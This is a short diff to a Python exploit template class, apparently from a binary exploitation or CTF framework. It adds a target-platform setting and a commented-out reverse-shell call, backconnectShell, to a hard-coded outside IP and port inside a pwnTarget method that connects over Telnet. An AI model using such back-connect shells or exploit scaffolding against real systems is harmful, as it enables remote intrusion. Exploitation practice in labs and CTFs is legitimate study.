@@ -10,6 +10,8 @@ class Templet(Payload):
 		Payload.__init__(self)
 		self.host[1] = '' # my Target host
 		self.port = 0x00 # my Target port
+		self.mode = 0 # x86 target platform
+		# self.mode = 1 x86_64 target platform	
 
 	# building my Payload
 	def buildPayload(self):
@@ -21,6 +23,7 @@ class Templet(Payload):
 
 	# ok i go to pwn it :D
 	def pwnTarget(self):
+		# shell.backconnectShell('192.241.177.173',8081)
 		conn = Telnet(self.host[0],self.port)
 		# ..... snip .....
 		# when i exploit a bin with NX was enabled
